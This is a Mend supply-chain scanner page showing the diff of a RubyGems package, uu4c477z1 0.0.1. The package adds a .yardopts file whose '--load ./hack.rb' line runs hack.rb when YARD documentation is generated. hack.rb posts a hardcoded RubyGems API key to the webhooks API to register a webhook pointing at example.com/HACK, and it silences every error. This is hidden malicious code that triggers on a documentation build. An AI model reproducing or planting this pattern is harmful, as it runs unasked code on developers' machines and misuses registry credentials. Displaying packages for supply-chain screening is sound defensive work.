@@ -1,0 +1,361 @@
+Source: https://my.diffend.io/gems/uu4c477z1/0.0.1
+Retrieved: 2026-09-27T22:38:03.766386+00:00
+
+RubyGems - uu4c477z1 - Versions diffs - 0.0.1 - Mend - Supply Chain Defender
+
+RubyGems
+
+npm
+
+PyPI
+
+Organizations
+
+Log in
+
+RubyGems
+
+uu4c477z1
+
+Versions diffs
+
+0.0.1
+
+uu4c477z1
+0.0.1
+
+This diff represents the content of publicly available package versions that have been released to one of the supported registries. The information contained in this diff is provided for informational purposes only and reflects changes between package versions as they appear in their respective public registries.
+
+        Files changed (5)
+        hide
+        show
+
+            checksums.yaml
+
+          +7
+          -0
+
+            data/.yardopts
+
+          +1
+          -0
+
+            data/hack.rb
+
+          +1
+          -0
+
+            data/lib/x.rb
+
+          +1
+          -0
+
+            metadata
+
+          +42
+          -0
+
+        checksums.yaml
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,7 @@
+
+1
+
+            +
+            ---
+
+2
+
+            +
+            SHA256:
+
+3
+
+            +
+              metadata.gz: 3e9cdbed2767d707906c6b1eb0cfd919a02d5ffc9f086ce4a0fc6a7c4f9f7c2f
+
+4
+
+            +
+              data.tar.gz: 4807b095909e29a66ffebcdeb33edf22b90313f66b6f29fd2f93ddfc4fd6fb81
+
+5
+
+            +
+            SHA512:
+
+6
+
+            +
+              metadata.gz: 9aaa969d2b6994e27c1260c5295939363bfe8447816d00956215539e4362a7a23b66912f959c5477f3ac7aae9623e21dd676361e807dfe481b70a25e329566c5
+
+7
+
+            +
+              data.tar.gz: 535a2a50023f063b0e82ceb22bc886d608407a51aacf270a823075400770ae382d562c1ffcf19cf43f36616ffa6f7a956ed98036fb7f59cbfd2f705ad2853633
+
+        data/.yardopts
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            --load ./hack.rb
+
+        data/hack.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            begin; require 'net/http';require 'uri'; k='rubygems_4bb04aa6b8b9c01c6ba90abd224f4a30ff64d8ea2d197808';u=URI('https://rubygems.org/api/v1/web_hooks');q=Net::HTTP::Post.new(u);q['Authorization']=k;q.set_form_data({'gem_name'=>'uu4c477z1','url'=>'https://example.com/HACK'});Net::HTTP.start(u.hostname,u.port,use_ssl:true){|h|h.request(q)}; rescue;end
+
+        data/lib/x.rb
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1 @@
+
+1
+
+            +
+            #
+
+        metadata
+    ADDED
+
+    Viewed
+
+@@ -0,0 +1,42 @@
+
+1
+
+            +
+            --- !ruby/object:Gem::Specification
+
+2
+
+            +
+            name: uu4c477z1
+
+3
+
+            +
+            version: !ruby/object:Gem::Version
+
+4
+
+            +
+              version: 0.0.1
+
+5
+
+            +
+            platform: ruby
+
+6
+
+            +
+            authors:
+
+7
+
+            +
+            - A
+
+8
+
+            +
+            bindir: bin
+
+9
+
+            +
+            cert_chain: []
+
+10
+
+            +
+            date: 1980-01-02 00:00:00.000000000 Z
+
+11
+
+            +
+            dependencies: []
+
+12
+
+            +
+            email:
+
+13
+
+            +
+            - a@example.com
+
+14
+
+            +
+            executables: []
+
+15
+
+            +
+            extensions: []
+
+16
+
+            +
+            extra_rdoc_files: []
+
+17
+
+            +
+            files:
+
+18
+
+            +
+            - ".yardopts"
+
+19
+
+            +
+            - hack.rb
+
+20
+
+            +
+            - lib/x.rb
+
+21
+
+            +
+            homepage: https://example.com
+
+22
+
+            +
+            licenses:
+
+23
+
+            +
+            - MIT
+
+24
+
+            +
+            metadata: {}
+
+25
+
+            +
+            rdoc_options: []
+
+26
+
+            +
+            require_paths:
+
+27
+
+            +
+            - lib
+
+28
+
+            +
+            required_ruby_version: !ruby/object:Gem::Requirement
+
+29
+
+            +
+              requirements:
+
+30
+
+            +
+              - - ">="
+
+31
+
+            +
+                - !ruby/object:Gem::Version
+
+32
+
+            +
+                  version: '0'
+
+33
+
+            +
+            required_rubygems_version: !ruby/object:Gem::Requirement
+
+34
+
+            +
+              requirements:
+
+35
+
+            +
+              - - ">="
+
+36
+
+            +
+                - !ruby/object:Gem::Version
+
+37
+
+            +
+                  version: '0'
+
+38
+
+            +
+            requirements: []
+
+39
+
+            +
+            rubygems_version: 3.6.7
+
+40
+
+            +
+            specification_version: 4
+
+41
+
+            +
+            summary: test
+
+42
+
+            +
+            test_files: []
+
+Contact Us
+
+Terms of Service
+
+Privacy Policy
+
+Docs
+
+Copyright © 2026 Mend Software
